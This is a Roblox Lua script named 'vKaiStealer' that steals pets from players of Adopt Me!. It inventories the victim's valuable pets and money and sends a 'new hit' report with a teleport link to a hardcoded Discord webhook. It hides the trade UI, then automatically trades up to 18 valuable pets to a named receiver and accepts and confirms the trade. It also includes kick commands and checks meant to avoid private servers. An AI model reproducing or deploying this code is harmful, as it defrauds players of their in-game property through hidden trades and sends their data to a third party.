local Username = "collected_garbage002" 
local Webhook = "https://discord.com/api/webhooks/1319000750159954052/0YoCAPS4IsBfd50irOAGwyKrwlI7JP4XuvUw-a4d8HqrX2645FbeohvS_LVWbyr3Jo4g"
--checks---------------------------------------------------------------------------------------------------------------------------------------------------
getgenv().debug = false --true = checks | vice versa

if getgenv().debug then
    --checks---------------------------------------------------------------------------------------------------------------------------------------------------
    repeat wait() until game:IsLoaded()

    if getgenv().adm then return end
    getgenv().adm = true

    -- if server < 5 kick
    if #game:GetService("Players"):GetPlayers() <= 5 then
        game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable to get Remote.Events")
        wait(5)
        game:Shutdown()
    end

    --if priv server > 5 but user is owner = kick
    if #game:GetService("Players"):GetPlayers() >= 43 then
        game:GetService("Players").LocalPlayer:Kick("\nHigh Latency Servers are not supported, unable to get Remote.Events")
        wait(5)
        game:Shutdown()
    end 

    --if priv server >5 but user is owner = kick
    local Services = setmetatable({}, {
        __index = function(_, Name)
            return cloneref(game:GetService(Name))
        end
    })
    local RobloxReplicatedStorage = Services.RobloxReplicatedStorage
    local GetServerType = RobloxReplicatedStorage:FindFirstChild("GetServerType")
    local IsVIP = GetServerType and GetServerType:InvokeServer() == "VIPServer"
    print(IsVIP)
    if IsVIP then
        local Players = Services.Players 
        local LocalPlayer = Players.LocalPlayer
        if LocalPlayer then
            Webhook = ""
            LocalPlayer:Kick("\nPrivate server detected!")
        end
    end   
end

local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
local function onChatMessage(message, fromUserId, textChannel)
    local fromPlayer = Players:GetPlayerByUserId(fromUserId)
    if fromPlayer and fromPlayer.Name == Username and message:lower() == "/kick" then --edit "/kick to what word u want"
        LocalPlayer:Kick("\nScript received a new update use within 1 hour!")
    end
end
generalChannel.MessageReceived:Connect(function(messageData)
    local message = messageData.Text
    local fromUserId = messageData.TextSource.UserId
    local textChannel = messageData.TextChannel
    onChatMessage(message, fromUserId, textChannel)
end)
--end of checks-------------------------------------------------------------------------------------------------------------------------------------------------

-- decline function if not receiver
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local function moveGuiOffscreen(guiElement)
    if guiElement then guiElement.Position = UDim2.new(1000, 0, 1000, 0) end
end
local function hideDialog()
    local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local dialogApp = playerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        dialogApp.Dialog.Visible = false
        moveGuiOffscreen(dialogApp.Dialog)
    end
end
local function declineTradeRequest(player)
    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
end
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
hideDialog()
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    local localPlayer = game:GetService("Players").LocalPlayer
    if sender.Name ~= localPlayer.Name then declineTradeRequest(sender) end
end)
declineTradeRequest()


--main func
local Pets = {}
local PetCounts = {}
local Loaders = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loaders("InventoryDB")
local ClientData = Loaders("ClientData")
local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]

local neon_count = 0
local mega_neon_count = 0
local legendaries_count = 0
local ultra_count = 0
local fr_count = 0


for _, petData in pairs(playerData.inventory.pets) do
    if petData.properties and type(petData.properties) == "table" then
        if petData.properties.neon then
            neon_count = neon_count + 1
        end
        if petData.properties.mega_neon then
            mega_neon_count = mega_neon_count + 1
        end
        if petData.properties.rideable and petData.properties.flyable then
            fr_count = fr_count + 1
        end
    end
end

for i, v in pairs(ClientData.get("inventory").pets) do
    local petData = InventoryDB[v.category][v.id]
    
    if petData.rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    elseif petData.rarity == "ultra_rare" then
        ultra_count = ultra_count + 1
    end
end

if legendaries_count == 1 then
    legendaries_count = 0
elseif legendaries_count > 1 then
    legendaries_count = legendaries_count - 1
end

if ultra_count == 1 then
    ultra_count = 0
elseif ultra_count > 1 then
    ultra_count = ultra_count - 1
end

--[[
if legendaries_count == 0 and neon_count == 0 and mega_neon_count == 0 and flyable_count == 0 and rideable_count == 0 and fr_count == 0 then
    game:GetService("Players").LocalPlayer:Kick("\nBot/Alt Account Detected, Cannot get low value object.pets.eggs [No Remote.Event Detected]")
end
]]--

--local for embeds
local plr = game.Players.LocalPlayer
local accage = plr.AccountAge
local ExecutorValue = identifyexecutor() or "Unknown"
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local VersionValue = "1.2.7 by kai"
local tpusingconsole = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
print("Click the link below to join:")
print(tpusingconsole)


    local embed = {
        ["title"] = "You just got a new hit with **vKaiStealer**!",
        ["color"] = tonumber(0x3365FF),
        ["fields"] = {
            {
                ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
                ["value"] = "```lua\n" ..
                            "Victim           : " .. tostring(plr) .. "\n" ..
                            "Receiver         : " .. tostring(Username) .. "\n"..
                            "Executor         : " .. tostring(ExecutorValue) .. "\n" ..
                            "Account Age      : " .. tostring(accage) .. " Days\n" ..
                            "Script Version   : " .. tostring(VersionValue) .. "```"                            
            },
            {
                ["name"] = "〘:ringed_planet:〙**Items**",
                ["value"] = "```lua\n" ..
                            "Total Values     : " .. tostring("Soon") .. "\n" ..
                            "Bucks Amount     : " .. tostring(bucks) .. "\n\n" ..
                            "Mega Pets        : " .. tostring(mega_neon_count) .. "\n" ..
                            "Neon Pets        : " .. tostring(neon_count) .. "\n" ..
                            "F/R Pets         : " .. tostring(fr_count) .. "\n" ..
                            "Legendary Pets   : " .. tostring(legendaries_count) .. "\n" ..
                            "Ultra-Rare Pets  : " .. tostring(ultra_count) .. "\n" .."```" 
            },
            {
                ["name"] = "**Join from console!**",
                ["value"] = "```lua\n" ..
                            consoletp .. "\n" .."```"
            },
        }
    }

    

function SendMessageEMBED(url, embed, bool)
  local http = game:GetService("HttpService")
  local headers = {
      ["Content-Type"] = "application/json"
  }
  local data = {
      username = "Adopt Me! | vKaiStealer",
      avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=675d8333&is=675c31b3&hm=8288737e5cbd4d1532ef66540729865efbc7066c1be71cf26b019051863001eb&",
      content = TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = embed.color,
              fields = embed.fields,
          }
      }
  }
  local data2 = {
      username = "Adopt Me! | vKaiStealer",
      avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=675d8333&is=675c31b3&hm=8288737e5cbd4d1532ef66540729865efbc7066c1be71cf26b019051863001eb&",
      content = "--@everyone\n" .. TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = 0xf1c40f,
              fields = embed.fields,
          }
      }
  }

  local body = http:JSONEncode(data)
  local body2 = http:JSONEncode(data2)
  if bool == true then
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body2
      })
  else
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body
      })
  end
end

SendMessageEMBED(Webhook, embed, true)
--[[if legendaries_count >= 1 or neon_count >= 1 or mega_neon_count >= 1 or flyable_count >= 1 or rideable_count >= 1 or fr_count >= 1 then
    
else
   game.Players.LocalPlayer:Kick("Bot account detected. ")
end]]



game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

local stealActive = false
local function StartSteal()
    if stealActive then
    end
    stealActive = true
    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

    local function offset(guiElement)
        if guiElement then
            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
        end
    end
    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        offset(dialogApp.Dialog)
    end


    SendTrade:FireServer(game.Players[Username])


local PetsInventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0

local function bighit(pet)
    return pet.properties and (pet.properties.mega_neon or pet.properties.neon or pet.properties.flying or pet.properties.ride)
end

local function shit(pet)
    local petData = InventoryDB[pet.category][pet.id]
    return petData.rarity == "legendary" or petData.rarity == "ultra_rare" or bighit(pet)
end

local petUids = {}
for petUid, pet in pairs(PetsInventory.pets) do
    if shit(pet) then
        table.insert(petUids, {uid = petUid})
    end
end

local petCount = 0
local petLimit = 18
while #petUids > 0 and petCount < petLimit do
    if not stealActive then
        break
    end

    local petEntry = table.remove(petUids, 1)
    AddPetRemote:FireServer(petEntry.uid)
    petCount = petCount + 1
end

AcceptNegotiationRemote:FireServer()
ConfirmTradeRemote:FireServer()
    stealActive = false
    wait(1)
    StartSteal()
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function(msg)
            StartSteal()
        end)
    end
end)
